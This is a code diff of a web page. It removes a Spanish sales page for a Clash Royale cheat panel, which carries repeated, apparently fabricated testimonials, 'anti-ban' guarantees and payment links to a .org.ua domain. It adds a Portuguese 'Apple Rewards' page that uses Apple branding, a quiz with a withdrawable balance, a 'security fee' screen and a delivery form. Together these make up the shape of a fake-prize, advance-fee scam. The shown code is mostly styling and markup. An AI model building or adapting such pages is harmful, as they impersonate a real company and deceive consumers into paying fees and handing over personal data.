@@ -1,536 +1,855 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Panel Clash Royale - Domina las Arenas con Elixir Infinito</title>
-    <meta name="description" content="El mejor panel de elixir para Clash Royale. Sube de arena rápidamente, domina tus batallas y garantiza victorias con 100% de seguridad.">
-    <link rel="icon" type="image/png" href="images/favicon.png">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/styles.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Apple Rewards</title>
+
+<style>
+    body {
+        background: #f5f5f7;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        min-height: 100vh;
+    }
+
+    .shine {
+        animation: shine 0.6s ease-out;
+    }
+
+    @keyframes shine {
+        0% { text-shadow: 0 0 0px gold; }
+        50% { text-shadow: 0 0 14px gold; }
+        100% { text-shadow: 0 0 0px gold; }
+    }
+
+    .container, .resgate-container, .taxa-container, .envio-container {
+        width: 95%;
+        max-width: 420px;
+        background: #ffffff;
+        margin-top: 25px;
+        border-radius: 22px;
+        padding: 25px;
+        box-shadow: 0px 8px 22px rgba(0,0,0,0.08);
+    }
     
-      <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
-<script>
-  window.pixelId = "986433453532988";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script><script async="" defer="" src="js/pixel.js"></script>
-  </head>
-  <body>
-    <!-- Header -->
-    <header class="header">
-        <div class="container">
-            <nav class="nav">
-                <span class="nav-item">DOMINA LAS ARENAS</span>
-                <span class="nav-separator">•</span>
-                <span class="nav-item">SUBE DE TROFEOS RÁPIDO</span>
-                <span class="nav-separator">•</span>
-                <span class="nav-item">DESCUENTO SOLO HOY</span>
-                <span class="nav-separator">•</span>
-                <span class="nav-item">ELIXIR INFINITO</span>
-                <span class="nav-separator">•</span>
-                <span class="nav-item">100% ANTI-BAN</span>
-                <span class="nav-separator">•</span>
-                <span class="nav-item">PANEL 100% SEGURO</span>
-                <span class="nav-separator0MINE AS ARENAS</span>
-                <span class=" nav-separator"="">•</span>
-                <span class="nav-item">SUBE DE TROFEOS RÁPIDO</span>
-                <span class="nav-separator">•</span>
-                <span class="nav-item">DESCUENTO SOLO HOY</span>
-                <span class="nav-separator">•</span>
-                <span class="nav-item">ELIXIR INFINITO</span>
-                <span class="nav-separator">•</span>
-                <span class="nav-item">100% ANTI-BAN</span>
-                <span class="nav-separator">•</span>
-                <span class="nav-item">PANEL 100% SEGURO</span>
-                <span class="nav-separator">•</span>
-            </nav>
+    .taxa-container {
+        /* Remove o padding lateral padrão de .container para que o conteúdo possa se estender nas bordas, como na imagem de referência */
+        padding: 0px; 
+        margin-top: 0;
+        border-radius: 0;
+        box-shadow: none;
+        max-width: 500px;
+    }
+    
+    .envio-container { /* Estilos da Nova Tela */
+        margin-top: 0;
+        border-radius: 0;
+        box-shadow: none;
+        max-width: 500px;
+    }
+
+    /* BARRA DE PROGRESSO */
+    .progress-wrapper {
+        width: 100%;
+        height: 10px;
+        background: #d9d9d9;
+        border-radius: 20px;
+        overflow: hidden;
+        margin-bottom: 20px;
+    }
+
+    .progress-bar {
+        height: 100%;
+        width: 0%;
+        background: #0071e3;
+        transition: 0.35s;
+    }
+
+    .topbar {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 25px;
+    }
+
+    .logo {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-weight: 600;
+        font-size: 18px;
+    }
+
+    .logo img {
+        width: 26px;
+    }
+
+    .money-box {
+        background: #f2f2f2;
+        padding: 6px 12px;
+        border-radius: 12px;
+        font-weight: 600;
+        font-size: 14px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    .btn-sac {
+        background: #000;
+        color: #fff;
+        padding: 6px 14px;
+        border-radius: 10px;
+        font-size: 13px;
+        font-weight: 600;
+        cursor: pointer;
+    }
+
+    h2 {
+        text-align: center;
+        font-size: 20px;
+        font-weight: 700;
+        color: #111;
+        margin-bottom: 10px;
+    }
+
+    .subtitle {
+        text-align: center;
+        color: #555;
+        margin-bottom: 20px;
+        font-size: 14px;
+    }
+
+    .option {
+        background: #fafafa;
+        padding: 14px;
+        border-radius: 14px;
+        border: 1px solid #e5e5e5;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin-bottom: 12px;
+        cursor: pointer;
+        transition: 0.2s;
+        font-weight: 500;
+    }
+
+    .option:hover {
+        background: #eaeaea;
+    }
+
+    button {
+        width: 100%;
+        background: #000;
+        color: #fff;
+        padding: 14px;
+        border: none;
+        border-radius: 14px;
+        font-size: 15px;
+        font-weight: 700;
+        margin-top: 18px;
+        cursor: pointer;
+        opacity: 0.7;
+    }
+
+    button.enabled {
+        opacity: 1;
+    }
+
+    .bonus {
+        text-align: center;
+        margin-top: 10px;
+        font-size: 13px;
+        color: #0071e3;
+    }
+
+    footer {
+        margin-top: 25px;
+        text-align: center;
+        font-size: 11px;
+        color: #777;
+    }
+
+    footer span {
+        color: #c90000;
+        font-weight: 600;
+    }
+
+    .popup {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: rgba(0,0,0,0.55);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+
+    .popup-box {
+        background: #fff;
+        width: 90%;
+        max-width: 360px;
+        border-radius: 20px;
+        padding: 25px;
+        text-align: center;
+    }
+
+    .popup-box h3 {
+        font-size: 20px;
+        font-weight: 700;
+        margin-bottom: 10px;
+    }
+
+    .popup-valor {
+        font-size: 32px;
+        font-weight: 800;
+        color: #00c851;
+        margin-bottom: 15px;
+    }
+
+    .popup-btn {
+        background: #000;
+        color: #fff;
+        border: none;
+        width: 100%;
+        padding: 14px;
+        border-radius: 12px;
+        font-size: 14px;
+        font-weight: 700;
+        cursor: pointer;
+    }
+
+    .popup-final .popup-box {
+        background: #6a0dad;
+        color: #fff;
+    }
+
+    .popup-final .popup-btn {
+        background: #fff;
+        color: #6a0dad;
+    }
+
+    .resgate-container, .taxa-container, .envio-container { display:none; }
+
+    .resgate-title {
+        font-size:22px;
+        font-weight:700;
+        text-align:center;
+        margin-bottom:15px;
+    }
+
+    .saldo-box {
+        background:#000;
+        padding:12px;
+        border-radius:16px;
+        color:#fff;
+        font-size:18px;
+        text-align:center;
+        margin-bottom:22px;
+        font-weight:700;
+    }
+
+    .valores-box {
+        display:grid;
+        grid-template-columns:1fr 1fr;
+        gap:12px;
+        margin-bottom:25px;
+    }
+
+    .valor-btn {
+        background:#f5f5f7;
+        border:1px solid #ccc;
+        padding:14px;
+        border-radius:12px;
+        text-align:center;
+        font-size:15px;
+        font-weight:600;
+        cursor:pointer;
+        transition:0.3s;
+    }
+
+    .valor-btn:hover { background:#e7e7ea; }
+
+    select, input {
+        width:100%;
+        padding:12px;
+        border-radius:12px;
+        border:1px solid #ccc;
+        margin-bottom:18px;
+        font-size:15px;
+    }
+
+    #btnSaque {
+        background:#0071e3;
+        font-size:16px;
+        border-radius:12px;
+    }
+
+    /* ESTILOS DA TELA DE TAXA DE SEGURANÇA */
+    .taxa-header {
+        text-align: center;
+        padding: 40px 25px 30px;
+        background: #fff;
+    }
+
+    .taxa-logo-apple {
+        width: 30px;
+        margin-bottom: 20px;
+    }
+    
+    .taxa-icon-check {
+        width: 35px;
+        height: 35px;
+        margin: 0 auto 10px;
+        color: #0071e3; /* Azul Apple para o ícone de check */
+    }
+
+    .taxa-title {
+        font-size: 26px;
+        font-weight: 700;
+        margin-bottom: 15px;
+        color: #1c1c1c;
+    }
+
+    .taxa-description {
+        font-size: 16px;
+        line-height: 1.5;
+        color: #333;
+        margin-bottom: 20px;
+    }
+
+    .taxa-reembolso {
+        font-size: 15px;
+        color: #555;
+        margin-bottom: 30px;
+    }
+
+    .taxa-item-list {
+        padding: 0 25px 25px;
+        background: #fff;
+    }
+
+    .taxa-item {
+        display: flex;
+        align-items: flex-start;
+        padding: 16px;
+        background: #f5f5f7; /* Cor de fundo suave do corpo */
+        border-radius: 12px;
+        margin-bottom: 15px;
+    }
+
+    .taxa-item-icon {
+        width: 24px;
+        height: 24px;
+        margin-right: 15px;
+        color: #000; /* Ícones em preto */
+        flex-shrink: 0;
+    }
+
+    .taxa-item-content {
+        flex-grow: 1;
+    }
+
+    .taxa-item-title {
+        font-size: 16px;
+        font-weight: 600;
+        color: #1c1c1c;
+        margin-bottom: 4px;
+    }
+
+    .taxa-item-text {
+        font-size: 14px;
+        color: #555;
+    }
+
+    .taxa-btn-sacar {
+        width: 100%;
+        background: #0071e3; /* Azul principal da Apple */
+        color: #fff;
+        padding: 18px;
+        border: none;
+        border-radius: 12px;
+        font-size: 18px;
+        font-weight: 700;
+        cursor: pointer;
+        margin: 0 auto 30px;
+        display: block;
+        max-width: 90%;
+    }
+    
+    /* ESTILOS DA NOVA TELA DE ENVIO */
+    .envio-header {
+        text-align: center;
+        padding-bottom: 20px;
+    }
+
+    .envio-header h2 {
+        font-size: 24px;
+        margin-bottom: 5px;
+    }
+
+    .envio-header p {
+        font-size: 15px;
+        color: #666;
+    }
+
+    .envio-icon-iphone {
+        width: 70px;
+        height: 70px;
+        color: #1c1c1c;
+        margin-bottom: 15px;
+    }
+
+    .envio-form label {
+        display: block;
+        font-size: 14px;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 6px;
+        margin-top: 15px;
+    }
+
+    .envio-form input {
+        width: calc(100% - 24px);
+        padding: 12px;
+        border-radius: 10px;
+        border: 1px solid #ddd;
+        font-size: 16px;
+        box-sizing: border-box;
+    }
+
+    .envio-btn-finalizar {
+        background: #0071e3;
+        font-size: 17px;
+        border-radius: 12px;
+        padding: 16px;
+        margin-top: 30px;
+    }
+    
+    /* Container para a VSL */
+    .vsl-container {
+        width: 100%;
+        max-width: 500px;
+        margin: 20px auto 0;
+        padding: 10px;
+        box-sizing: border-box;
+    }
+    
+    .vsl-wrapper {
+        position: relative;
+        padding-top: 56.25%;
+        border-radius: 15px;
+        overflow: hidden;
+        box-shadow: 0px 4px 15px rgba(0,0,0,0.1);
+    }
+
+    .vsl-wrapper iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        border: none;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="vsl-container">
+    <div class="vsl-wrapper">
+        <iframe src="https://player-vz-71e4b53c-7bb.tv.pandavideo.com.br/embed/?v=5f73afe9-4ca3-4964-a476-f57d784ac591" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    </div>
+</div>
+<audio id="coinSound">
+    <source src="media/mixkit-fairy-coin-voice-1089.mp3" type="audio/mpeg">
+</audio>
+
+<div class="container" id="quizContainer">
+
+    <div class="topbar">
+        <div class="logo">
+            <img src="images/Apple_logo_black.svg">
+            Apple
         </div>
-    </header>
 
-    <!-- Hero Section -->
-    <section class="hero">
-        <div class="container">
-            <div class="logo-container">
-                <img src="images/gota-de-elixir.png" alt="Gota de Elixir" class="logo-image">
-            </div>
-            
-            <h1 class="hero-title">
-                El Mejor Panel de<br>
-                <span class="highlight">Elixir Infinito</span><br>
-                de Clash Royale
-            </h1>
-            
-            <!-- Trust Badges -->
-            <div class="trust-badges">
-                <div class="badge-item">
-                    <svg class="badge-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 2L3 7V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V7L12 2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                        <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                    </svg>
-                    <span>100% Anti-Ban</span>
-                </div>
-            </div>
-            
-            <!-- VSL Container -->
-            <div class="vsl-container">
-                <div class="vsl-wrapper">
-                    <iframe src="https://player.vimeo.com/video/1132679540?badge=0&autopause=0&player_id=0&app_id=58479" frameborder="0" allow="autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media; web-share" referrerpolicy="strict-origin-when-cross-origin" style="position:absolute;top:0;left:0;width:100%;height:100%;" title="Clash Royale"></iframe>
-                </div>
-            </div>
-            <script src="js/player.js"></script>
-
-            <a href="#planos" class="btn btn-primary btn-large">
-                ACCEDER AL PANEL
-            </a>
-            
-            <!-- Testimonials Carousel -->
-            <div class="testimonials-carousel-wrapper">
-                <div class="testimonials-carousel">
-                    <!-- First Set -->
-                    <div class="carousel-item">
-                        <div class="carousel-header">
-                            <img src="images/3c06ab3668f2ca88cb6ccbd6c344a851f1a694a9-hq.jpg" alt="Fernando Silva" class="carousel-avatar">
-                            <div>
-                                <h4>Fernando Silva</h4>
-                                <div class="carousel-stars">⭐⭐⭐⭐⭐</div>
-                            </div>
-                        </div>
-                        <p>¡Pasé de 5.2k a 9.1k de trofeos en menos de 1 mes! El elixir infinito hace el juego totalmente diferente 🔥</p>
-                        <span class="carousel-time">Hace 2h</span>
-                    </div>
-                    
-                    <div class="carousel-item">
-                        <div class="carousel-header">
-                            <img src="images/68fbfd0136729.jpg" alt="Thalesinho" class="carousel-avatar">
-                            <div>
-                                <h4>Thalesinho</h4>
-                                <div class="carousel-stars">⭐⭐⭐⭐⭐</div>
-                            </div>
-                        </div>
-                        <p>¡La ventaja competitiva es una locura! Suelto tropas sin parar mientras el otro cuenta elixir. ¡Sistema 100% anti-ban!</p>
-                        <span class="carousel-time">Hace 5h</span>
-                    </div>
-                    
-                    <div class="carousel-item">
-                        <div class="carousel-header">
-                            <img src="images/68fbfd668fc6c.jpg" alt="Marcio" class="carousel-avatar">
-                            <div>
-                                <h4>Marcio</h4>
-                                <div class="carousel-stars">⭐⭐⭐⭐⭐</div>
-                            </div>
-                        </div>
-                        <p>¡Me volví adicto! Mando 4 Golem a la arena y todos se vuelven locos jajaja. De 4.8k fui a 9.5k en 3 semanas. ¡LO MEJOR!</p>
-                        <span class="carousel-time">Hace 1 día</span>
-                    </div>
-                    
-                    <div class="carousel-item">
-                        <div class="carousel-header">
-                            <img src="images/85d9bda45cbe351f973f8d445faecc0c.jpg" alt="ZappyBoy" class="carousel-avatar">
-                            <div>
-                                <h4>ZappyBoy</h4>
-                                <div class="carousel-stars">⭐⭐⭐⭐⭐</div>
-                            </div>
-                        </div>
-                        <p>Bro, ¡este panel cambió mi juego! Ciclo tropas mucho más rápido que el rival. Hasta parece injusto 😅</p>
-                        <span class="carousel-time">Hace 8h</span>
-                    </div>
-                    
-                    <div class="carousel-item">
-                        <div class="carousel-header">
-                            <img src="images/f683fbbb1defce575306ab4be0dd5d36.jpg" alt="TheRealKing" class="carousel-avatar">
-                            <div>
-                                <h4>TheRealKing</h4>
-                                <div class="carousel-stars">⭐⭐⭐⭐⭐</div>
-                            </div>
-                        </div>
-                        <p>Mi rival esperando que suba el elixir… y yo ya solté tres Pekkas, dos Golems y un Zap 🔥</p>
-                        <span class="carousel-time">Hace 3h</span>
-                    </div>
-                    
-                    <!-- Duplicate Set for Seamless Loop -->
-                    <div class="carousel-item">
-                        <div class="carousel-header">
-                            <img src="images/3c06ab3668f2ca88cb6ccbd6c344a851f1a694a9-hq.jpg" alt="Fernando Silva" class="carousel-avatar">
-                            <div>
-                                <h4>Fernando Silva</h4>
-                                <div class="carousel-stars">⭐⭐⭐⭐⭐</div>
-                            </div>
-                        </div>
-                        <p>¡Pasé de 5.2k a 9.1k de trofeos en menos de 1 mes! El elixir infinito hace el juego totalmente diferente 🔥</p>
-                        <span class="carousel-time">Hace 2h</span>
-                    </div>
-                    
-                    <div class="carousel-item">
-                        <div class="carousel-header">
-                            <img src="images/68fbfd0136729.jpg" alt="Thalesinho" class="carousel-avatar">
-                            <div>
-                                <h4>Thalesinho</h4>
-                                <div class="carousel-stars">⭐⭐⭐⭐⭐</div>
-                            </div>
-                        </div>
-                        <p>¡La ventaja competitiva es una locura! Suelto tropas sin parar mientras el otro cuenta elixir. ¡Sistema 100% anti-ban!</p>
-                        <span class="carousel-time">Hace 5h</span>
-                    </div>
-                    
-                    <div class="carousel-item">
-                        <div class="carousel-header">
-                            <img src="images/68fbfd668fc6c.jpg" alt="Marcio" class="carousel-avatar">
-                            <div>
-                                <h4>Marcio</h4>
-                                <div class="carousel-stars">⭐⭐⭐⭐⭐</div>
-                            </div>
-                        </div>
-                        <p>¡Me volví adicto! Mando 4 Golem a la arena y todos se vuelven locos jajaja. De 4.8k fui a 9.5k en 3 semanas. ¡LO MEJOR!</p>
-                        <span class="carousel-time">Hace 1 día</span>
-                    </div>
-                    
-                    <div class="carousel-item">
-                        <div class="carousel-header">
-                            <img src="images/85d9bda45cbe351f973f8d445faecc0c.jpg" alt="ZappyBoy" class="carousel-avatar">
-                            <div>
-                                <h4>ZappyBoy</h4>
-                                <div class="carousel-stars">⭐⭐⭐⭐⭐</div>
-                            </div>
-                        </div>
-                        <p>Bro, ¡este panel cambió mi juego! Ciclo tropas mucho más rápido que el rival. Hasta parece injusto 😅</p>
-                        <span class="carousel-time">Hace 8h</span>
-                    </div>
-                    
-                    <div class="carousel-item">
-                        <div class="carousel-header">
-                            <img src="images/f683fbbb1defce575306ab4be0dd5d36.jpg" alt="TheRealKing" class="carousel-avatar">
-                            <div>
-                                <h4>TheRealKing</h4>
-                                <div class="carousel-stars">⭐⭐⭐⭐⭐</div>
-                            </div>
-                        </div>
-                        <p>Mi rival esperando que suba el elixir… y yo ya solté tres Pekkas, dos Golems y un Zap 🔥</p>
-                        <span class="carousel-time">Hace 3h</span>
-                    </div>
-                </div>
-            </div>
+        <div class="money-box">
+            <span id="saldoTopo">R$0,00</span>
+            <div class="btn-sac">SACAR</div>
         </div>
-    </section>
+    </div>
 
-    <!-- Benefits Section -->
-    <section class="benefits">
-        <div class="container">
-            <h2 class="section-title">
-                El Panel de <span class="highlight">Elixir Royale</span> es para ti si:
-            </h2>
-            
-            <div class="benefits-grid">
-                <div class="benefit-card">
-                    <div class="benefit-icon">
-                        <svg class="icon-animated" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"></circle>
-                            <circle cx="12" cy="12" r="4" fill="currentColor"></circle>
-                            <path d="M12 2L12 6M12 18L12 22M2 12L6 12M18 12L22 12" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
-                        </svg>
-                    </div>
-                    <h3>Ya no aguantas perder partidas y quieres subir de arena rápidamente</h3>
-                </div>
-                
-                <div class="benefit-card">
-                    <div class="benefit-icon">
-                        <svg class="icon-animated" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M13 2L3 14H12L11 22L21 10H12L13 2Z" fill="currentColor" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
-                        </svg>
-                    </div>
-                    <h3>Quieres tener ventajas competitivas y dominar todas las batallas</h3>
-                </div>
-            </div>
-        </div>
-    </section>
+    <div class="progress-wrapper">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
 
-    <!-- Testimonials Section -->
-    <section class="testimonials">
-        <div class="container">
-            <h2 class="section-title">Mira los Testimonios de Nuestros Players que Usan el Panel de Elixir Infinito</h2>
-            
-            <div class="testimonials-grid">
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <img src="images/3c06ab3668f2ca88cb6ccbd6c344a851f1a694a9-hq.jpg" alt="Fernando Silva" class="testimonial-avatar">
-                        <div>
-                            <h4>Fernando Silva</h4>
-                            <div class="stars">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p>¡Pasé de 5.2k a 9.1k de trofeos en menos de 1 mes! El elixir infinito hace el juego totalmente diferente, puedo jugar con cualquier deck y dominar. ¡La mejor compra que he hecho! 🔥</p>
-                    <span class="testimonial-time">Hace 2h</span>
-                </div>
+    <h2 id="question-title"></h2>
+    <div class="subtitle">Selecione uma opção para continuar:</div>
+    <div id="options"></div>
 
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <img src="images/68fbfd0136729.jpg" alt="Thalesinho" class="testimonial-avatar">
-                        <div>
-                            <h4>Thalesinho</h4>
-                            <div class="stars">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p>¡La ventaja competitiva es una locura! Suelto tropas sin parar mientras el otro cuenta elixir. ¡Sistema 100% anti-ban funcionando perfecto, cero preocupaciones!</p>
-                    <span class="testimonial-time">Hace 5h</span>
-                </div>
+    <button id="continuar">Continuar</button>
 
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <img src="images/68fbfd668fc6c.jpg" alt="Marcio" class="testimonial-avatar">
-                        <div>
-                            <h4>Marcio</h4>
-                            <div class="stars">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p>¡Me volví adicto! Mando 4 Golem a la arena y todos se vuelven locos jajaja. De 4.8k fui a 9.5k en 3 semanas. El panel es rápido, estable y muy fácil de usar. ¡LO MEJOR!</p>
-                    <span class="testimonial-time">Hace 1 día</span>
-                </div>
+    <div class="bonus">Concorra a um bônus especial Apple</div>
 
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <img src="images/85d9bda45cbe351f973f8d445faecc0c.jpg" alt="ZappyBoy" class="testimonial-avatar">
-                        <div>
-                            <h4>ZappyBoy</h4>
-                            <div class="stars">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p>Bro, ¡este panel cambió mi juego! Ahora ciclo tropas mucho más rápido que el rival. Hasta parece injusto 😅 ¡Elixir Royale es una locura!</p>
-                    <span class="testimonial-time">Hace 8h</span>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <img src="images/f683fbbb1defce575306ab4be0dd5d36.jpg" alt="TheRealKing" class="testimonial-avatar">
-                        <div>
-                            <h4>TheRealKing</h4>
-                            <div class="stars">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p>Mi rival esperando que suba el elixir… y yo ya solté tres Pekkas, dos Golems y un Zap nomás para humillarlo. Elixir Royale es literalmente trampa autorizada 🔥</p>
-                    <span class="testimonial-time">Hace 3h</span>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Pricing Section -->
-    <section class="pricing" id="planos">
-        <div class="container">
-            <h2 class="section-title-large">
-                Elige tu Panel de<br>
-                <span class="highlight">Elixir Infinito</span><br>
-                y Domina las Arenas
-            </h2>
-            <p class="pricing-description">
-                ⚡ ¡Domina las arenas, sube de trofeos y conviértete en PRO PLAYER! 🔥
-            </p>
-            
-            <div class="pricing-grid">
-                <div class="pricing-card pricing-card-basic">
-                    <div class="basic-card-content">
-                        <div class="basic-card-left">
-                            <h3 class="pricing-title-basic">Panel Basic</h3>
-                            <p class="pricing-subtitle-top-basic">Por 1 Mes</p>
-                            <div class="pricing-price-basic">
-                                <span class="currency-basic">$</span>
-                                <span class="amount-basic">59</span>
-                            </div>
-                            <p class="pricing-subtitle-basic">o 12x de $5.83</p>
-                        </div>
-                        <div class="basic-card-right">
-                            <div class="card-image-container-basic">
-                                <img src="images/PACOTE-BASICO-DE-ELIXIR.png" alt="Panel Básico" class="card-image">
-                            </div>
-                        </div>
-                    </div>
-                    <a href="https://compraseguraonline.org.ua/c/0137cc09ea" target="_blank" class="btn btn-secondary btn-full btn-basic-full">
-                        ELEGIR PANEL
-                    </a>
-                    <div class="pricing-security pricing-security-basic">
-                        🔒 Pago 100% Seguro
-                    </div>
-                </div>
-
-                <div class="pricing-card pricing-card-featured">
-                    <div class="badge-recommended">🔥 MÁS VENDIDO</div>
-                    
-                    <div class="featured-header-centered">
-                        <h3 class="pricing-title-featured-centered">Panel Permanente</h3>
-                        <p class="pricing-subtitle-featured-centered">Acceso de por Vida</p>
-                    </div>
-                    
-                    <div class="card-image-container-featured-centered">
-                        <img src="images/PACOTE-PERMANENTE-DE-ELIXIR.png" alt="Panel Permanente" class="card-image card-image-premium">
-                    </div>
-                    
-                    <div class="features-title-featured">Todo lo que recibes:</div>
-                    
-                    <ul class="pricing-features pricing-features-featured">
-                        <li class="included">✓ Panel de Elixir Infinito</li>
-                        <li class="included">✓ Acceso 24h a la Plataforma</li>
-                        <li class="included">✓ 100% Seguro y Anti-Ban</li>
-                        <li class="included">✓ Domina las Arenas</li>
-                        <li class="included">✓ Actualizaciones cada 7 días</li>
-                        <li class="included">✓ Soporte prioritario</li>
-                        <li class="included">✓ Acceso de por vida</li>
-                        <li class="included">✓ Recursos exclusivos VIP</li>
-                    </ul>
-                    
-                    <div class="pricing-section-featured">
-                        <div class="pricing-price-featured-bottom">
-                            <span class="currency-featured">$</span>
-                            <span class="amount-featured">129</span>
-                        </div>
-                        <p class="pricing-subtitle-featured-bottom">o 12x de $12.42</p>
-                    </div>
-                    
-                    <a href="https://compraseguraonline.org.ua/c/1ab96b1491" target="_blank" class="btn btn-primary btn-full btn-featured-full">
-                        ELEGIR PANEL
-                    </a>
-                    <div class="pricing-security pricing-security-featured">
-                        🔒 Pago 100% Seguro | Acceso Instantáneo
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Two Paths Section -->
-    <section class="two-paths">
-        <div class="container">
-            <h2 class="section-title">Ahora Tienes 2 Caminos</h2>
-            
-            <div class="paths-grid">
-                <div class="path-card path-negative">
-                    <div class="path-icon">❌</div>
-                    <p>Seguir como estás, siendo llamado malo por perder partidas y no poder subir de arena.</p>
-                </div>
-                
-                <div class="path-card path-positive">
-                    <div class="path-icon">✅</div>
-                    <p>Aprovechar y conseguir el Panel de Elixir por <strong>$59 MXN</strong> para empezar a dominar las arenas y que todos te llamen pro player.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- FAQ Section -->
-    <section class="faq">
-        <div class="container">
-            <h2 class="section-title">Preguntas Frecuentes</h2>
-            
-            <div class="faq-list">
-                <div class="faq-item">
-                    <button class="faq-question">
-                        <span>¿Me van a ayudar con la instalación?</span>
-                        <span class="faq-icon">+</span>
-                    </button>
-                    <div class="faq-answer">
-                        <p>¡Sí! Tenemos soporte completo para ayudarte en todo el proceso de instalación y configuración del panel.</p>
-                    </div>
-                </div>
-
-                <div class="faq-item">
-                    <button class="faq-question">
-                        <span>¿Desde dónde accedo al Panel?</span>
-                        <span class="faq-icon">+</span>
-                    </button>
-                    <div class="faq-answer">
-                        <p>Después de la compra, recibirás un enlace de acceso y todas las instrucciones necesarias por correo electrónico.</p>
-                    </div>
-                </div>
-
-                <div class="faq-item">
-                    <button class="faq-question">
-                        <span>¿Solo descargo y listo, ya funciona?</span>
-                        <span class="faq-icon">+</span>
-                    </button>
-                    <div class="faq-answer">
-                        <p>¡Sí! Es muy sencillo. Después de la descarga, solo sigue los pasos básicos de instalación y ya puedes empezar a usarlo.</p>
-                    </div>
-                </div>
-
-                <div class="faq-item">
-                    <button class="faq-question">
-                        <span>¿Es seguro? ¿Me van a banear?</span>
-                        <span class="faq-icon">+</span>
-                    </button>
-                    <div class="faq-answer">
-                        <p>Nuestro panel es 100% seguro y anti-ban. Utilizamos las mejores tecnologías de protección para garantizar la seguridad de tu cuenta.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-brand">
-                    <img src="images/gota-de-elixir.png" alt="Elixir Royale" class="footer-logo">
-                    <h3>Elixir Royale</h3>
-                    <p>Domina las arenas con seguridad</p>
-                </div>
-                
-                <div class="footer-links">
-                    <div class="footer-column">
-                        <h4>Legal</h4>
-                        <ul>
-                            <li><a href="#">Términos de Uso</a></li>
-                            <li><a href="#">Privacidad</a></li>
-                            <li><a href="#">Reembolso</a></li>
-                        </ul>
-                    </div>
-                    
-                    <div class="footer-column">
-                        <h4>Soporte</h4>
-                        <ul>
-                            <li><a href="#">FAQ</a></li>
-                            <li><a href="#">Contacto</a></li>
-                            <li><a href="#">Ayuda</a></li>
-                        </ul>
-                    </div>
-                    
-                    <div class="footer-column">
-                        <h4>Seguridad</h4>
-                        <div class="footer-badges">
-                            <div class="footer-badge">
-                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M12 2L3 7V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V7L12 2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                                    <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                                </svg>
-                                <span>100% Anti-Ban</span>
-                            </div>
-                            <div class="footer-badge">
-                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                    <rect x="3" y="11" width="18" height="11" rx="2" stroke="currentColor" stroke-width="2"></rect>
-                                    <path d="M7 11V7C7 4.23858 9.23858 2 12 2C14.7614 2 17 4.23858 17 7V11" stroke="currentColor" stroke-width="2"></path>
-                                </svg>
-                                <span>Pago Seguro</span>
-                            </div>
-                        </div>
-                    </div>
